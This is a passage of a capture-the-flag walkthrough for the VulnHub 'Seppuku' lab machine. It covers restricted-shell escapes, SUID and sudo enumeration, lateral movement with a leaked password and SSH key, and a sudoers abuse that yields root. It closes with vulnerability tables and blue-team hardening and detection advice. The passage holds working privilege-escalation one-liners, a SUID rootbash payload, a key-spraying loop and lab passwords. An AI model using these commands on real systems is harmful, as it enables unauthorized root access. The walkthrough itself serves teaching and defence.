> printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n' > /tmp/evil/service
> chmod +x /tmp/evil/service
> export PATH=/tmp/evil:$PATH
> # wait for the root job to run, then:
> /tmp/rootbash -p
> ```
>
> **Find the opportunity** by inspecting what the privileged program actually calls:
>
> ```bash
> strace -f -e trace=execve /usr/local/bin/script.sh 2>&1 | grep execve
> strings /usr/local/bin/script.sh | grep -E 'system\(|popen\(|exec'
> ```
>
> An `execve("service", ...)` with **no leading `/`** is the vulnerability. A fully
> qualified `/usr/sbin/service` is not.
>
> **Check cron's own PATH first** — `/etc/crontab` usually sets
> `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`, and
> `sudo`'s `secure_path` overrides yours entirely. If `/tmp` cannot get into that
> list, look instead for a writable directory that is *already* in it —
> `/usr/local/bin` very often is.
>
> **Deep dive:** [CONCEPTS §15.8 — PATH hijacking](../../docs/CONCEPTS.md#158-path-hijacking)

```text
seppuku@192.168.56.104's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue May 12 10:02:11 2020 from 192.168.56.1
seppuku@seppuku:~$ id
uid=1000(seppuku) gid=1000(seppuku) groups=1000(seppuku)
seppuku@seppuku:~$ ls -lsa
total 36
 4 drwxr-xr-x 3 seppuku seppuku 4096 May 12  2020 .
 4 drwxr-xr-x 5 root    root    4096 May 12  2020 ..
 4 -rw------- 1 seppuku seppuku   24 May 12  2020 .bash_history
 4 -rw-r--r-- 1 seppuku seppuku  220 May 12  2020 .bash_logout
 4 -rw-r--r-- 1 seppuku seppuku 3771 May 12  2020 .bashrc
 4 -rw-r--r-- 1 seppuku seppuku   12 May 12  2020 .passwd
 4 -rw-r--r-- 1 seppuku seppuku  807 May 12  2020 .profile
 4 drwxr-xr-x 2 seppuku seppuku 4096 May 12  2020 .ssh
seppuku@seppuku:~$ cat .passwd
123456789abcdef
seppuku@seppuku:~$ cd /home
-rbash: cd: restricted command
seppuku@seppuku:~$ cd ..
-rbash: cd: restricted command
seppuku@seppuku:~$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify `/' in command names
seppuku@seppuku:~$ export PATH=/tmp:$PATH
-rbash: PATH: readonly variable
```

> **Two findings and one obstacle.**
>
> **Finding 1: `.passwd` contains `123456789abcdef`.** A hidden dot-file with a
> password in a home directory. We do not know whose it is yet — hold it.
>
> **Obstacle: we are in `rbash`.** Recall from § 2.5 that `passwd.bak` listed
> `/bin/rbash` as every user's shell.
>
> **What `rbash` is:** bash invoked as `rbash` (or with `-r`) enters **restricted
> mode**. It is a genuine bash feature, not a separate program. In restricted mode
> bash refuses to:
> - change directory (`cd`)
> - set or unset `SHELL`, `PATH`, `ENV`, `BASH_ENV`
> - run any command containing a `/` (so no absolute or relative paths)
> - redirect output with `>`, `>>`, `>|`, `<`, `>&`, `2>`
> - use `exec` to replace the shell
> - disable restricted mode
>
> **Why it is not a security boundary:** it restricts the *shell*, not the *programs*.
> Anything that can spawn a new, unrestricted shell — a scripting interpreter, an
> editor with a `:!cmd` escape, `ssh` itself — defeats it. **Never use rbash as an
> access control**; it is a convenience for kiosk-style setups.
>
> **Note the `-rbash:` prefix on the errors** — that is the giveaway. If you see it,
> you are restricted.

### 4.2 Escape rbash — four methods

**Method 1 (cleanest) — bypass the profile entirely at connection time:**

```bash
ssh seppuku@192.168.56.104 -t "bash --noprofile"
```

```text
seppuku@192.168.56.104's password:
seppuku@seppuku:~$ cd /home
seppuku@seppuku:/home$ ls -la
total 24
drwxr-xr-x  5 root    root    4096 May 12  2020 .
drwxr-xr-x 24 root    root    4096 May 12  2020 ..
drwxr-xr-x  4 samurai samurai 4096 May 12  2020 samurai
drwxr-xr-x  3 seppuku seppuku 4096 May 12  2020 seppuku
drwxr-xr-x  4 tanto   tanto   4096 May 12  2020 tanto
```

> **`--noprofile`** tells bash not to read `/etc/profile` or `~/.bash_profile`. The
> restriction is normally applied by the login shell (`/bin/rbash` from
> `/etc/passwd`) plus a `readonly PATH` in `~/.bashrc`. Starting a fresh,
> non-restricted `bash` via SSH's command channel sidesteps both.
>
> `-t` forces pseudo-terminal allocation, so we get an interactive shell rather than a
> one-shot command.

**Method 2 — a scripting interpreter (works from inside the restricted shell):**

```bash
seppuku@seppuku:~$ python3 -c 'import os; os.system("/bin/bash");'
seppuku@seppuku:~$ cd /home && pwd
/home
```

> Python's `os.system` calls `/bin/sh -c` directly, with no regard for bash's
> restricted flag. Other interpreters work identically:
> ```bash
> perl -e 'exec "/bin/bash";'
> php -r 'system("/bin/bash");'
> awk 'BEGIN {system("/bin/bash")}'
> find / -name foo -exec /bin/bash \;
> ```

**Method 3 — an editor's shell escape:**

```bash
seppuku@seppuku:~$ vim -c ':!/bin/bash'
```

> `vim`, `less`, `more`, `man` and `git` all offer `!command` escapes. See
> <https://gtfobins.github.io> — every entry has an "escape restricted shell" section.

**Method 4 — SSH port forwarding to reach a service directly**, bypassing the shell
altogether (useful when even the interpreters are removed):

```bash
ssh -N -L 8080:127.0.0.1:80 seppuku@192.168.56.104
```

> **Full reference list:** <https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/>

### 4.3 Enumerate properly now that we are unrestricted

```bash
seppuku@seppuku:/home$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
```

```text
root:x:0:0:root:/root:/bin/bash
seppuku:x:1000:1000:seppuku,,,:/home/seppuku:/bin/rbash
samurai:x:1001:1001:,,,:/home/samurai:/bin/rbash
tanto:x:1002:1002:,,,:/home/tanto:/bin/rbash
```

> The live `/etc/passwd` matches `passwd.bak` exactly — and confirms **there is no
> `quyen`**. The shadow.bak hash really was a decoy.


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
seppuku@seppuku:/home$ sudo -l
[sudo] password for seppuku:
Sorry, user seppuku may not run sudo on seppuku.
seppuku@seppuku:/home$ ls -la samurai tanto
ls: cannot open directory 'samurai': Permission denied
ls: cannot open directory 'tanto': Permission denied
seppuku@seppuku:/home$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
```

> No sudo, no SUID abuse, no access to the other two home directories. **So we use the
> password from `.passwd` to move sideways.**

---

## 5. Lateral movement — `seppuku` → `samurai` → root

### 5.1 `su samurai` with the hidden password

```bash
seppuku@seppuku:/home$ su samurai
Password: 123456789abcdef
samurai@seppuku:/home$ id
uid=1001(samurai) gid=1001(samurai) groups=1001(samurai)
```

> **The `.passwd` file was `samurai`'s password, left in `seppuku`'s home directory.**
> That is exactly the "credential sprawl" pattern real breaches exploit: a password
> written down where a colleague can read it.
>
> *(If `su` complains `standard in must be a tty`, escape rbash with Method 2 first,
> or upgrade the TTY: `python3 -c 'import pty; pty.spawn("/bin/bash")'`.)*

### 5.2 `sudo -l` — the pivotal discovery

```bash
samurai@seppuku:~$ sudo -l
```

```text
Matching Defaults entries for samurai on seppuku:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User samurai may run the following commands on seppuku:
    (root) NOPASSWD: /home/tanto/.cgi_bin/bin /tmp/*
```

> **Read this line with total care — it decides the rest of the box.**
>
> ```text
> (root) NOPASSWD: /home/tanto/.cgi_bin/bin /tmp/*
>  ^^^^   ^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^
>  RUNAS  no passwd the exact binary        argument pattern
> ```
>
> - **`(root)`** — the command runs **as root**.
> - **`NOPASSWD:`** — samurai is not prompted for a password.
> - **`/home/tanto/.cgi_bin/bin`** — the *only* permitted program, by absolute path.
> - **`/tmp/*`** — the argument must match this glob. sudo will refuse any other
>   argument list.
>
> **So: whatever `/home/tanto/.cgi_bin/bin` does, it does it as root.** And the
> argument is constrained but `/tmp/*` is a directory *we can write to*.
>
> **Now check whether the file exists:**

```bash
samurai@seppuku:~$ ls -la /home/tanto/.cgi_bin/
ls: cannot access '/home/tanto/.cgi_bin/': No such file or directory
samurai@seppuku:~$ ls -la /home/tanto
ls: cannot open directory '/home/tanto': Permission denied
```

> **Two obstacles:**
> 1. `.cgi_bin/bin` **does not exist**. The sudoers rule points at a file that was
>    never created (or was deleted).
> 2. `samurai` **cannot write to `/home/tanto`** — it is `drwxr-x--- tanto tanto`.
>
> **This is the box's central puzzle, and the lesson is general:**
> *A sudoers rule that grants execution of a file inside a directory another user
> controls is a grant of that user's write access.* The administrator assumed
> `tanto`'s home was safe. It is not — because **we have `tanto`'s private key**.

### 5.3 Become `tanto` with the key from `/keys/`

```bash
# on Kali
chmod 600 seppuku_key
ssh -i seppuku_key tanto@192.168.56.104 -t "bash --noprofile"
```

```text
tanto@seppuku:~$ id
uid=1002(tanto) gid=1002(tanto) groups=1002(tanto)
tanto@seppuku:~$ pwd
/home/tanto
tanto@seppuku:~$ ls -la
total 32
drwxr-x--- 4 tanto tanto 4096 May 12  2020 .
drwxr-xr-x 5 root  root  4096 May 12  2020 ..
-rw------- 1 tanto tanto   24 May 12  2020 .bash_history
-rw-r--r-- 1 tanto tanto  220 May 12  2020 .bash_logout
-rw-r--r-- 1 tanto tanto 3771 May 12  2020 .bashrc
-rw-r--r-- 1 tanto tanto  807 May 12  2020 .profile
drwxrwxr-x 2 tanto tanto 4096 May 12  2020 .ssh
```

> **No password prompt** — the key authenticated us. And `-t "bash --noprofile"` again
> escapes `tanto`'s `rbash`.
>
> **The key was `tanto`'s all along.** Remember to test a recovered private key
> against *every* username you have enumerated (`seppuku`, `samurai`, `tanto`,
> `root`), not just the one it was named after:
> ```bash
> for u in seppuku samurai tanto root; do
>   echo "--- $u"
>   ssh -i seppuku_key -o BatchMode=yes -o StrictHostKeyChecking=no \
>       -o ConnectTimeout=5 "$u@192.168.56.104" id 2>&1 | head -2
> done
> ```

### 5.4 Create the file sudoers already trusts

```bash
tanto@seppuku:~$ mkdir -p .cgi_bin
tanto@seppuku:~$ cd .cgi_bin
tanto@seppuku:~/.cgi_bin$ printf '#!/bin/bash\n/bin/bash\n' > bin
tanto@seppuku:~/.cgi_bin$ chmod 777 bin
tanto@seppuku:~/.cgi_bin$ ls -la
total 12
drwxrwxr-x 2 tanto tanto 4096 May  4 11:48 .
drwxr-x--- 5 tanto tanto 4096 May  4 11:48 ..
-rwxrwxrwx 1 tanto tanto   22 May  4 11:48 bin
tanto@seppuku:~/.cgi_bin$ cat bin
#!/bin/bash
/bin/bash
```

> **Why a script rather than a symlink to `/bin/bash`?** Because sudoers matched the
> *path* `/home/tanto/.cgi_bin/bin`; sudo will execute whatever is at that path as
> **root**. The content is entirely ours to choose.
>
> `chmod 777` is not strictly needed (samurai only needs `x`, and the file is read as
> root anyway), but several walkthroughs use it to sidestep any group-permission
> subtlety. On a real system `755` would suffice — `777` is never the right answer.

### 5.5 Trigger it as `samurai`

Return to the `samurai` session:

```bash
samurai@seppuku:~$ sudo /home/tanto/.cgi_bin/bin /tmp/x
```

```text
root@seppuku:/home/samurai# id
uid=0(root) gid=0(root) groups=0(root)
root@seppuku:/home/samurai# whoami
root
root@seppuku:/home/samurai# hostname
seppuku
```

**Root.** ✅

> **What happened, step by step:**
> 1. `sudo` checked its rule: is `samurai` allowed to run
>    `/home/tanto/.cgi_bin/bin` as `root` without a password, with an argument
>    matching `/tmp/*`? **Yes.**
> 2. `/tmp/x` need not exist — sudo matches the *string* against the glob, it does not
>    stat the file. (If your build complains, `touch /tmp/x` first.)
> 3. `sudo` `execve()`d our script **with UID 0**.
> 4. Our script ran `/bin/bash` → an interactive **root** shell. Prompt is now `#`.
>
> **The `../../../..` variant.** Some walkthroughs use:
> ```bash
> sudo ../../../../home/tanto/.cgi_bin/bin /tmp/*
> ```
> That works because sudo resolves the path before matching, and on some sudoers
> configurations the rule is written relative to the invoking directory. **Prefer the
> absolute path** — it is unambiguous and matches the rule as printed by `sudo -l`.
>
> **Also note the literal `*`** in some versions of the command. In an interactive
> shell, `*` is glob-expanded by *your* shell before sudo sees it — which can break
> the match if the current directory has files. Quote it (`'/tmp/*'`) or name a
> specific file (`/tmp/x`) to be safe.

### 5.6 Read the flag

```bash
root@seppuku:~# cd /root
root@seppuku:/root# ls -la
total 32
drwx------  4 root root 4096 May 12  2020 .
drwxr-xr-x 24 root root 4096 May 12  2020 ..
-rw-r--r--  1 root root 3106 Apr  4  2018 .bashrc
-rw-------  1 root root  220 May 12  2020 flag.txt
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  3 root root 4096 May 12  2020 .local
root@seppuku:/root# cat flag.txt
```

```text
Congratulations! You have rooted Seppuku.

You navigated the rabbit holes, escaped the restricted shells and chained
three users together. Well done.

-- SunCSR Team
```

*(The exact wording varies by image revision; the file is always `/root/flag.txt`.)*

![Root shell and /root/flag.txt](images/06-flag.png)

---

## 6. Alternate routes and documented dead ends

Recording these is part of professional reporting — and this box is *designed* around
them.

| Attempt | Command | Result | Why |
| --- | --- | --- | --- |
| Crack `shadow.bak` | `john --format=sha512crypt shadow.bak` | Cracks to `1234567890` for user `quyen` | **`quyen` does not exist** on the box. Pure decoy. |
| CKEditor CVEs on :7601 | `searchsploit ckeditor` | Not exploitable | Requires an authenticated session we never obtain |
| Port 80 Basic auth | `hydra -s 80 … http-get /` | No hit | No credential source points at it |
| Port 8088 login | `sqlmap -u …/login --forms --batch` | Not injectable | Static form, no backend |
| SambaCry CVE-2017-7494 | `nmap --script smb-vuln-cve2017-7494` | `State: UNKNOWN — No writable share found` | Needs a writable share |
| FTP `anon.txt` | `curl ftp://…/anon.txt` | "Nothing interesting here" | Author's explicit troll |
| Kernel exploit | `uname -r` → `4.15.0-101-generic` | Not applicable | Ubuntu 18.04 at the 2020 patch level; no era-appropriate LPE |
| `jack.jpg` stego | `steghide extract -sf jack.jpg` | No embedded data | The EXIF comment "Use the ripper!" points at John, which is the decoy path |

---

## 7. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **Unauthenticated directory listing on a non-standard port** | `http://:7601/keys/`, `/secret/` | Full disclosure of a private key and a wordlist |
| 2 | **SSH private key served over HTTP, with no passphrase** | `/keys/private` | Passwordless login as `tanto` |
| 3 | **Target-specific password list published** | `/secret/password.lst` | Made the SSH brute force minutes instead of days |
| 4 | Username disclosed in a public file | `/secret/hostname` | `seppuku` |
| 5 | **SMB null session + RID cycling** | ports 139/445 | Enumerated `seppuku`, `samurai`, `tanto` with no credentials |
| 6 | SMB message signing disabled | Samba 4.7.6 | Relay-attack exposure on a real network |
| 7 | **Weak SSH password** | `seppuku` / `eeyoree` | Initial foothold |
| 8 | **HTTP Basic authentication over cleartext HTTP** | port 80 | Credentials would traverse the wire in base64 |
| 9 | **Password written in a hidden file in a colleague's home directory** | `/home/seppuku/.passwd` | `seppuku` → `samurai` |
| 10 | **`rbash` used as an access control** | all three users' shells | Trivially bypassed four different ways |
| 11 | **sudoers rule pointing at a file inside another user's writable home** | `(root) NOPASSWD: /home/tanto/.cgi_bin/bin /tmp/*` | `samurai` → **root** |
| 12 | Leftover backup files with password hashes on a web server | `passwd.bak`, `shadow.bak` | Information disclosure (decoy, but a real finding) |
| 13 | Unused services exposed (CKEditor, port 8088 login, port 7080) | :7601, :8088, :7080 | Attack surface with no business purpose |

## 8. Defensive lessons (blue team)

1. **Audit every `sudoers` entry for paths inside user-writable directories.** This
   is the finding that mattered most, and it is one command to detect:
   ```bash
   # for each command in sudoers, is it inside a home directory?
   sudo grep -RhoE '/[^ ]+' /etc/sudoers /etc/sudoers.d/ | sort -u | while read -r f; do
       case "$f" in /home/*|/tmp/*|/var/tmp/*|/dev/shm/*) echo "RISKY: $f" ;; esac
   done
   ```
   A rule granting root execution of anything under `/home/<user>/`, `/tmp`, or a
   world-writable path is **equivalent to granting that user root**. Move the helper to
   `/usr/local/sbin/`, own it `root:root`, mode `0755`, and verify with
   `visudo -c`.
2. **Also audit the argument glob.** `/tmp/*` lets the invoker choose the argument.
   Prefer no argument at all, or a fixed absolute one. And remember sudo matches
   *strings*, not existing files.
3. **`rbash` is not a security control.** If you need to confine a user, use:
   - a real restricted shell with an allow-list (`lshell`, `rbash` + a locked
     `authorized_keys` `command=`),
   - `ForceCommand internal-sftp` with a chroot for file-transfer-only users:
     ```text
     Match User transferonly
         ChrootDirectory /srv/transfer
         ForceCommand internal-sftp
         AllowTcpForwarding no
         X11Forwarding no
     ```
   - or an application-level authorisation layer. Never rely on the shell.
4. **Never publish private keys.** Scan your web roots, repos and object storage:
   ```bash
   grep -rIl --exclude-dir=.git 'BEGIN \(RSA\|OPENSSH\|EC\|DSA\) PRIVATE KEY' /var/www /srv /home 2>/dev/null
   ```
   Enforce passphrases on every key (`ssh-keygen -p -o -f key`), use short-lived
   certificates from an SSH CA instead of long-lived keys, and restrict
   `authorized_keys` with `from=`, `no-agent-forwarding`, `no-port-forwarding`,
   `no-pty`.
5. **Disable SMB null sessions and require signing:**
   ```ini
   [global]
       restrict anonymous = 2
       map to guest = never
       server signing = mandatory
       server min protocol = SMB2_10
   ```
   Then verify with `enum4linux` — RID cycling should return nothing.
6. **Disable FTP anonymous access**; remove vsftpd and use SFTP.
7. **Enforce a real password policy.** `eeyoree` and `123456789abcdef` both fall to a
   small dictionary. `pam_pwquality` (`minlen=14 dictcheck=1 usercheck=1
   enforce_for_root`), `pam_faillock` (3 failures → 15-minute lockout), and SSH
   key-only auth:
   ```text
   # /etc/ssh/sshd_config
   PasswordAuthentication no
   PermitRootLogin no
   MaxAuthTries 3
   LoginGraceTime 20
   ```
8. **Remove backup and decoy files from web roots.** `passwd.bak`, `shadow.bak`,
   `*.old`, `*.orig`, `*.swp`, `.git/`, `.env` — deny them at the server *and* keep
   them out of the deploy artefact:
   ```apache
   <FilesMatch "\.(bak|old|orig|swp|save|~)$">
       Require all denied
   </FilesMatch>
   RedirectMatch 404 /\.
   ```
9. **Do not run unused services.** CKEditor, the port-8088 login and the port-7080
   TLS listener all added surface and no value. Remove or firewall them.
10. **Detection opportunities.**
    - Alert on any HTTP request to a path containing `/keys/`, `/secret/`, `.bak`,
      `id_rsa`, or whose response body matches `BEGIN .* PRIVATE KEY`.
    - SSH: many `Failed password for seppuku` followed by `Accepted password` →
      brute-force success. Deploy `fail2ban` with the `sshd` jail.
    - auditd on `authorized_keys` and on the sudoers file:
      ```bash
      auditctl -w /home/tanto/.ssh -p wa -k ssh_keys
      auditctl -w /etc/sudoers -p wa -k sudoers_change
      auditctl -w /etc/sudoers.d/ -p wa -k sudoers_change
      ```
    - **Alert on file creation inside a path referenced by a sudoers rule.** The
      moment `.cgi_bin/bin` appeared, that should have paged someone.
    - Alert on `sudo` executing a script owned by a non-root user — a very
      high-fidelity indicator:
      ```bash
      ausearch -k sudo_log | grep -i 'exe="/home/'
      ```
    - Alert on `su` succeeding from a session whose parent is `sshd` and whose source
      account differs.

---

## 9. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/seppuku-1,484/>
- Series: <https://vulnhub.com/series/seppuku,318/>
- Community writeups consulted:
  - [InfoSec Institute — Capture the flag: A walkthrough of SunCSR's Seppuku](https://resources.infosecinstitute.com/topic/capture-the-flag-a-walkthrough-of-suncsrs-seppuku/) · [expanded version](https://www.infosecinstitute.com/resources/capture-the-flag/capture-the-flag-a-walkthrough-of-suncsrs-seppuku/)
  - [HackNos — Seppuku Vulnhub Walkthrough](https://www.hacknos.com/seppuku-vulnhub-walkthrough/)
  - [Raj Chandel — Seppuku:1 Vulnhub Walkthrough](https://chandel1.rssing.com/chan-10364660/article1383.html)
  - [ahlinbabak — Seppuku: 1 VulnHub Walkthrough](https://medium.com/@ahlinbabak/seppuku-1-vulnhub-walkthrough-beea41846775)
  - [jamesjarviscyber — Seppuku | OffSec Writeup & summary](https://medium.com/@jamesjarviscyber/seppuku-offsec-writeup-summary-db9cf6cc10d1)
- Background reading:
  - [Hacking Articles — Multiple Methods to Bypass Restricted Shell](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/)
  - [`rbash(1)` / bash RESTRICTED SHELL section](https://www.gnu.org/software/bash/manual/bash.html#The-Restricted-Shell)
  - [`sudoers(5)` man page — the Runas_Spec and command-argument grammar](https://man7.org/linux/man-pages/man5/sudoers.5.html)
  - [GTFOBins — escape restricted shells](https://gtfobins.github.io/#shell)
  - [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) · [hydra](https://github.com/vanhauser-thc/thc-hydra) · [ncrack](https://nmap.org/ncrack/)
  - [John the Ripper](https://www.openwall.com/john/doc/) · [`steghide`](http://steghide.sourceforge.net/) · [`exiftool`](https://exiftool.org/)
  - [OWASP — HTTP Basic Authentication](https://owasp.org/www-community/attacks/Brute_force_attack) · [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)
  - [CVE-2017-7494 — SambaCry](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## 10. Screenshot checklist

- [ ] `images/01-nmap.png` — the seven open ports
- [ ] `images/02-gobuster.png` — `/keys` and `/secret` on port 7601
- [ ] `images/03-secret.png` — the `/secret/` listing and the `shadow.bak` decoy
- [ ] `images/04-hydra.png` — `seppuku : eeyoree`
- [ ] `images/05-rbash.png` — the `-rbash: cd: restricted command` errors and the escape
- [ ] `images/06-flag.png` — `sudo /home/tanto/.cgi_bin/bin` → root → `flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
